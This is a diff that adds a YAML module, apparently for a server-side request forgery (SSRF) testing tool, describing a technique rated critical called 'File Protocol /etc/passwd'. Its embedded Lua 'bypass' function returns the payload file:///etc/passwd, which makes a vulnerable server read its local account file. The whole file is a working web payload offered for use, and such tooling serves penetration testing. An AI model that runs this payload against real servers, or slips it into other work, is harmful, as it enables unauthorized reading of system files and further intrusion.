@@ -1,0 +1,24 @@
+meta:
+  id: file_etc_passwd
+  version: 1
+  name: "File Protocol /etc/passwd"
+  description: "Reads /etc/passwd using file://"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 90
+  confidence: 80
+  severity: critical
+  tags: [file, local, read]
+  references: []
+match:
+  schemes: [http, https, file]
+  requires: [hostname]
+  supports: [file]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "file:///etc/passwd" }
+    end
